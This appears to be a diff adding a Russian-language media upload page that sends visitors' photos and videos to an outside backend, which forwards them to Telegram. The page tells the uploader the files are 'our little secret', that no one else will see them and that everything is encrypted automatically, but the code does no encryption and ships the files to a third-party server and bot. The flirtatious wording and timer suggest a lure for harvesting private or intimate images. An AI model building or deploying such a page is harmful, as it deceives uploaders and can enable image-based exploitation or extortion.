@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Загрузка медиафайлов</title>
+  <style>
+    /* ── Reset & Base ── */
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #0f1117;
+      --surface: #1a1d27;
+      --card: #22263a;
+      --accent: #d946ef;
+      --accent2: #f472b6;
+      --success: #22c55e;
+      --warning: #f59e0b;
+      --error: #ef4444;
+      --text: #e2e8f0;
+      --muted: #64748b;
+      --border: #2d3250;
+      --radius: 14px;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    /* ── Layout ── */
+    .container {
+      width: 100%;
+      max-width: 580px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    /* ── Header ── */
+    .header {
+      text-align: center;
+    }
+
+    .header .icon {
+      font-size: 2.8rem;
+      margin-bottom: 8px;
+    }
+
+    .header h1 {
+      font-size: 1.6rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, var(--accent2), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .header p {
+      font-size: 0.9rem;
+      color: var(--muted);
+      margin-top: 6px;
+    }
+
+    /* ── Card ── */
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+    }
+
+    /* ── Drop zone ── */
+    .drop-zone {
+      border: 2px dashed var(--border);
+      border-radius: var(--radius);
+      padding: 40px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      position: relative;
+    }
+
+    .drop-zone:hover,
+    .drop-zone.dragover {
+      border-color: var(--accent);
+      background: rgba(108, 99, 255, 0.06);
+    }
+
+    .drop-zone input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+    }
+
+    .drop-zone .dz-icon {
+      font-size: 2.4rem;
+      margin-bottom: 12px;
+    }
+
+    .drop-zone .dz-label {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .drop-zone .dz-hint {
+      font-size: 0.82rem;
+      color: var(--muted);
+      margin-top: 6px;
+    }
+
+    /* ── Stats bar ── */
+    .stats-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      font-size: 0.83rem;
+      color: var(--muted);
+      padding: 0 2px;
+    }
+
+    .stats-bar .counter {
+      color: var(--accent2);
+      font-weight: 600;
+    }
+
+    /* ── Timer ── */
+    .timer-wrap {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.83rem;
+    }
+
+    .timer-wrap.visible {
+      display: flex;
+    }
+
+    .timer-bar-track {
+      flex: 1;
+      height: 6px;
+      background: var(--border);
+      border-radius: 99px;
+      overflow: hidden;
+    }
+
+    .timer-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      border-radius: 99px;
+      transition: width 1s linear, background 1s linear;
+    }
+
+    .timer-text {
+      white-space: nowrap;
+      min-width: 48px;
+      text-align: right;
+      font-variant-numeric: tabular-nums;
+      color: var(--accent2);
+      font-weight: 600;
+    }
+
+    /* ── Preview Grid ── */
+    .preview-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+      gap: 10px;
+    }
+
+    .preview-item {
+      position: relative;
+      aspect-ratio: 1;
+      border-radius: 10px;
+      overflow: hidden;
+      background: var(--surface);
+      border: 1px solid var(--border);
+    }
+
+    .preview-item img,
+    .preview-item video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .preview-item .remove-btn {
+      position: absolute;
+      top: 4px;
+      right: 4px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: rgba(0, 0, 0, 0.7);
+      border: none;
+      color: #fff;
+      font-size: 13px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+
+    .preview-item .remove-btn:hover {
+      background: var(--error);
+    }
+
+    .preview-item .vid-badge {
+      position: absolute;
+      bottom: 4px;
+      left: 4px;
+      font-size: 0.65rem;
+      background: rgba(0, 0, 0, 0.65);
+      padding: 2px 5px;
+      border-radius: 4px;
+      color: #fff;
+    }
+
+    .preview-item .status-overlay {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      background: rgba(0, 0, 0, 0.5);
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .preview-item.uploading .status-overlay {
+      opacity: 1;
+    }
+
+    .preview-item.done .status-overlay {
+      opacity: 1;
+    }
+
+    /* ── Progress bar (per-upload) ── */
+    .upload-progress {
+      display: none;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .upload-progress.visible {
+      display: flex;
+    }
+
+    .progress-track {
+      height: 8px;
+      background: var(--border);
+      border-radius: 99px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      border-radius: 99px;
+      transition: width 0.3s ease;
+    }
+
+    .progress-label {
+      font-size: 0.8rem;
+      color: var(--muted);
+      text-align: center;
+    }
+
+    /* ── Buttons ── */
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 14px 20px;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent), #8b5cf6);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(108, 99, 255, 0.35);
+    }
+
+    .btn-primary:not(:disabled):hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 28px rgba(108, 99, 255, 0.5);
+    }
+
+    .btn-secondary {
+      background: var(--surface);
+      color: var(--text);
+      border: 1px solid var(--border);
+    }
+
+    .btn-secondary:not(:disabled):hover {
+      border-color: var(--accent);
+    }
+
+    /* ── Toast / Status ── */
+    .status-msg {
+      display: none;
+      align-items: center;
+      gap: 10px;
+      padding: 14px 18px;
+      border-radius: var(--radius);
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    .status-msg.visible {
+      display: flex;
+    }
+
+    .status-msg.info {
+      background: rgba(108, 99, 255, 0.15);
+      border: 1px solid var(--accent);
+      color: var(--accent2);
+    }
+
+    .status-msg.success {
+      background: rgba(34, 197, 94, 0.12);
+      border: 1px solid var(--success);
+      color: var(--success);
+    }
+
+    .status-msg.error {
+      background: rgba(239, 68, 68, 0.12);
+      border: 1px solid var(--error);
+      color: var(--error);
+    }
+
+    .status-msg.warning {
+      background: rgba(245, 158, 11, 0.12);
+      border: 1px solid var(--warning);
+      color: var(--warning);
+    }
+
+    /* ── Spinner ── */
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid currentColor;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+
+    /* ── Footer ── */
+    footer {
+      font-size: 0.75rem;
+      color: var(--muted);
+      text-align: center;
+      padding-top: 8px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <!-- Header -->
+    <div class="header">
+      <div class="icon">🌸</div>
+      <h1>Только для тебя</h1>
+      <p>Это наш маленький секрет <br> Никто, кроме нас, не увидит ❤️</p>
+    </div>
+
+    <!-- Upload Card -->
+    <div class="card">
+
+      <!-- Drop Zone -->
+      <div class="drop-zone" id="dropZone">
+        <input type="file" id="fileInput" multiple accept="image/*,video/*" />
+        <div class="dz-icon">📁</div>
+        <div class="dz-label">Кидай сюда свои кадры 😏</div>
+        <div class="dz-hint">Фото и видео · до 20 штук · до 200 МБ на файл</div>
+      </div>
+
+      <!-- Stats -->
+      <div class="stats-bar" style="margin-top:14px;">
+        <span>Уже выбрано: <span class="counter" id="fileCount">0</span> из 20 ❤️</span>
+        <div class="timer-wrap" id="timerWrap">
+          <span>⏱</span>
+          <div class="timer-bar-track">
+            <div class="timer-bar-fill" id="timerFill"></div>
+          </div>
+          <span class="timer-text" id="timerText">7:00</span>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Preview Grid Card -->
+    <div class="card" id="previewCard" style="display:none;">
+      <div class="preview-grid" id="previewGrid"></div>
+    </div>
+
+    <!-- Upload Progress -->
+    <div class="upload-progress" id="uploadProgress">
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+      <div class="progress-label" id="progressLabel">Загрузка…</div>
+    </div>
+
+    <!-- Status Message -->
+    <div class="status-msg" id="statusMsg">
+      <span id="statusIcon"></span>
+      <span id="statusText"></span>
+    </div>
+
+    <!-- Action Buttons -->
+    <div style="display:flex; gap:12px;">
+      <button class="btn btn-secondary" id="clearBtn" onclick="clearAll()" style="max-width:160px;" disabled>
+        🗑 Очистить
+      </button>
+      <button class="btn btn-primary" id="sendBtn" onclick="sendFiles()" disabled>
+        <span id="sendBtnText">Отправить мне ❤️</span>
+      </button>
+    </div>
+
+    <footer>
+        ✨ Всё шифруется автоматически
+    </footer>
+
+  </div>
+
+  <script>
+    // ══════════════════════════════════════════════════════
+    //  НАСТРОЙКА — замените URL на адрес вашего бэкенда!
+    // ══════════════════════════════════════════════════════
+    const BACKEND_URL = 'https://gettoway.alwaysdata.net'; // ← ЗАМЕНИТЬ
+    // Пример: 'https://my-bot-backend.railway.app'
+    // Пример: 'http://localhost:3001'  (только для локального теста)
+    // ══════════════════════════════════════════════════════
+
+    const MAX_FILES = 20;
+    const SESSION_TTL = 7 * 60; // секунды
+
+    // Состояние
+    let selectedFiles = [];  // { file: File, id: string }
+    let sessionId = null;
+    let sessionExpiry = null;
+    let timerInterval = null;
+    let isSending = false;
+
+    // DOM
+    const fileInput = document.getElementById('fileInput');
+    const dropZone = document.getElementById('dropZone');
+    const fileCount = document.getElementById('fileCount');
+    const previewCard = document.getElementById('previewCard');
+    const previewGrid = document.getElementById('previewGrid');
+    const sendBtn = document.getElementById('sendBtn');
+    const sendBtnText = document.getElementById('sendBtnText');
+    const clearBtn = document.getElementById('clearBtn');
+    const progressWrap = document.getElementById('uploadProgress');
+    const progressFill = document.getElementById('progressFill');
+    const progressLabel = document.getElementById('progressLabel');
+    const timerWrap = document.getElementById('timerWrap');
+    const timerFill = document.getElementById('timerFill');
+    const timerText = document.getElementById('timerText');
+
+    // ── Drag-and-drop ──────────────────────────────────────
+    dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('dragover'); });
+    dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
+    dropZone.addEventListener('drop', e => {
+      e.preventDefault();
+      dropZone.classList.remove('dragover');
+      handleNewFiles(Array.from(e.dataTransfer.files));
+    });
+    fileInput.addEventListener('change', () => {
+      handleNewFiles(Array.from(fileInput.files));
+      fileInput.value = '';
+    });
+
+    // ── File handling ──────────────────────────────────────
+    function handleNewFiles(newFiles) {
+      const allowed = newFiles.filter(f => f.type.startsWith('image/') || f.type.startsWith('video/'));
+      const slots = MAX_FILES - selectedFiles.length;
+      const toAdd = allowed.slice(0, slots);
+
+      if (allowed.length > slots) {
+        showStatus('warning', `⚠️ Добавлено ${toAdd.length} из ${allowed.length} файлов. Лимит: ${MAX_FILES}.`);
+      }
+      if (toAdd.length === 0) return;
+
+      toAdd.forEach(file => {
+        const id = Math.random().toString(36).slice(2);
+        selectedFiles.push({ file, id });
+        addPreviewItem(file, id);
+      });
+
+      updateUI();
+    }
+
+    function addPreviewItem(file, id) {
+      const item = document.createElement('div');
+      item.className = 'preview-item';
+      item.id = 'prev-' + id;
+
+      if (file.type.startsWith('image/')) {
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(file);
+        img.onload = () => URL.revokeObjectURL(img.src);
+        item.appendChild(img);
+      } else {
+        const vid = document.createElement('video');
+        vid.src = URL.createObjectURL(file);
+        vid.muted = true;
+        vid.onloadeddata = () => URL.revokeObjectURL(vid.src);
+        item.appendChild(vid);
+        const badge = document.createElement('span');
+        badge.className = 'vid-badge';
+        badge.textContent = '▶ video';
+        item.appendChild(badge);
+      }
+
+      const overlay = document.createElement('div');
+      overlay.className = 'status-overlay';
+      overlay.id = 'overlay-' + id;
+      item.appendChild(overlay);
+
+      const btn = document.createElement('button');
+      btn.className = 'remove-btn';
+      btn.innerHTML = '✕';
+      btn.title = 'Удалить';
+      btn.onclick = () => removeFile(id);
+      item.appendChild(btn);
+
+      previewGrid.appendChild(item);
+    }
+
+    function removeFile(id) {
+      selectedFiles = selectedFiles.filter(f => f.id !== id);
+      const el = document.getElementById('prev-' + id);
+      if (el) el.remove();
+      updateUI();
+    }
+
+    function updateUI() {
+      const count = selectedFiles.length;
+      fileCount.textContent = count;
+      previewCard.style.display = count > 0 ? 'block' : 'none';
+      sendBtn.disabled = count === 0 || isSending;
+      clearBtn.disabled = count === 0 || isSending;
+    }
+
+    function clearAll() {
+      selectedFiles = [];
+      previewGrid.innerHTML = '';
+      sessionId = null;
+      sessionExpiry = null;
+      stopTimer();
+      hideProgress();
+      hideStatus();
+      timerWrap.classList.remove('visible');
+      updateUI();
+    }
+
+    // ── Session ───────────────────────────────────────────
+    async function ensureSession() {
+      if (sessionId) {
+        // Проверяем что сессия ещё жива
+        try {
+          const r = await fetch(`${BACKEND_URL}/api/session/${sessionId}/status`);
+          if (r.ok) return sessionId;
+        } catch (_) { }
+      }
+      const r = await fetch(`${BACKEND_URL}/api/session/create`, { method: 'POST' });
+      if (!r.ok) throw new Error('Не удалось создать сессию');
+      const data = await r.json();
+      sessionId = data.sessionId;
+      sessionExpiry = Date.now() + data.ttlSeconds * 1000;
+      startTimer(data.ttlSeconds);
+      return sessionId;
+    }
+
+    // ── Timer ─────────────────────────────────────────────
+    function startTimer(totalSeconds) {
+      stopTimer();
+      const startTime = Date.now();
+      timerWrap.classList.add('visible');
+
+      timerInterval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const remaining = Math.max(0, totalSeconds - elapsed);
+        const pct = (remaining / totalSeconds) * 100;
+
+        timerFill.style.width = pct + '%';
+        if (pct < 20) {
+          timerFill.style.background = '#ef4444';
+        } else if (pct < 40) {
+          timerFill.style.background = 'linear-gradient(90deg, #f59e0b, #ef4444)';
+        }
+
+        const mins = Math.floor(remaining / 60);
+        const secs = Math.floor(remaining % 60);
+        timerText.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+
+        if (remaining <= 0) {
+          stopTimer();
+          timerText.textContent = '0:00';
+          showStatus('error', '⏰ Сессия истекла. Пожалуйста, начните заново.');
+          clearAll();
+        }
+      }, 500);
+    }
+
+    function stopTimer() {
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+    }
+
+    // ── Send ──────────────────────────────────────────────
+    async function sendFiles() {
+      if (isSending || selectedFiles.length === 0) return;
+      isSending = true;
+      sendBtn.disabled = true;
+      clearBtn.disabled = true;
+      sendBtnText.innerHTML = '<span class="spinner"></span> Подготовка...';
+
+      try {
+        // 1. Создаём / получаем сессию
+        showStatus('info', '🌸 Готовим волшебную ссылку…');
+        const sid = await ensureSession();
+
+        // 2. Загружаем файлы батчами по 5
+        const BATCH = 5;
+        let uploaded = 0;
+        const total = selectedFiles.length;
+
+        showProgress(0, `Загрузка файлов (0 / ${total})…`);
+
+        for (let i = 0; i < selectedFiles.length; i += BATCH) {
+          const batch = selectedFiles.slice(i, i + BATCH);
+          const formData = new FormData();
+          batch.forEach(({ file }) => formData.append('files', file));
+
+          // Пометим элементы как "загружаются"
+          batch.forEach(({ id }) => {
+            const item = document.getElementById('prev-' + id);
+            if (item) {
+              item.classList.add('uploading');
+              const ov = document.getElementById('overlay-' + id);
+              if (ov) ov.textContent = '⬆️';
+            }
+          });
+
+          const r = await fetch(`${BACKEND_URL}/api/upload/${sid}`, {
+            method: 'POST',
+            body: formData,
+          });
+
+          if (!r.ok) {
+            const err = await r.json().catch(() => ({ error: 'Неизвестная ошибка' }));
+            throw new Error(err.error || `HTTP ${r.status}`);
+          }
+
+          // Пометим как готовые
+          batch.forEach(({ id }) => {
+            const item = document.getElementById('prev-' + id);
+            if (item) {
+              item.classList.remove('uploading');
+              item.classList.add('done');
+              const ov = document.getElementById('overlay-' + id);
+              if (ov) ov.textContent = '✅';
+            }
+          });
+
+          uploaded += batch.length;
+          const pct = Math.round((uploaded / total) * 100);
+          showProgress(pct, `Загрузка файлов (${uploaded} / ${total})…`);
+          sendBtnText.innerHTML = `<span class="spinner"></span> Загрузка ${uploaded}/${total}…`;
+        }
+
+        // 3. Отправляем команду на форвардинг в Telegram
+        showProgress(100, 'Отправка в Telegram…');
+        showStatus('info', '✉️ Пересылаю твои фото…');
+        sendBtnText.innerHTML = '<span class="spinner"></span> Отправка в Telegram…';
+
+        const sendR = await fetch(`${BACKEND_URL}/api/send/${sid}`, { method: 'POST' });
+        if (!sendR.ok) {
+          const err = await sendR.json().catch(() => ({ error: 'Ошибка отправки' }));
+          throw new Error(err.error || `HTTP ${sendR.status}`);
+        }
+
+        // 4. Успех!
+        stopTimer();
+        hideProgress();
+        showStatus('success', `✅ ${total} файлов успешно отправлено в Telegram! Сессия завершена.`);
+        sendBtnText.textContent = '✅ Отправлено!';
+        timerWrap.classList.remove('visible');
+
+        // Блокируем повторную отправку
+        setTimeout(() => {
+          clearAll();
+          sendBtnText.textContent = '📤 Отправить в Telegram';
+          isSending = false;
+        }, 4000);
+
+      } catch (err) {
+        console.error(err);
+        showStatus('error', `❌ Ошибка: ${err.message}`);
+        sendBtnText.textContent = '📤 Отправить в Telegram';
+        sendBtn.disabled = false;
+        clearBtn.disabled = false;
+        isSending = false;
+        hideProgress();
+      }
+    }
+
+    // ── Helpers ───────────────────────────────────────────
+    function showStatus(type, text) {
+      const el = document.getElementById('statusMsg');
+      const icon = document.getElementById('statusIcon');
+      const txt = document.getElementById('statusText');
+      el.className = `status-msg visible ${type}`;
+      icon.textContent = '';
+      txt.textContent = text;
+    }
+    function hideStatus() {
+      document.getElementById('statusMsg').className = 'status-msg';
+    }
+
+    function showProgress(pct, label) {
+      progressWrap.classList.add('visible');
+      progressFill.style.width = pct + '%';
+      progressLabel.textContent = label;
+    }
+    function hideProgress() {
+      progressWrap.classList.remove('visible');
+      progressFill.style.width = '0%';
+    }
+  </script>
+</body>
+
+</html>
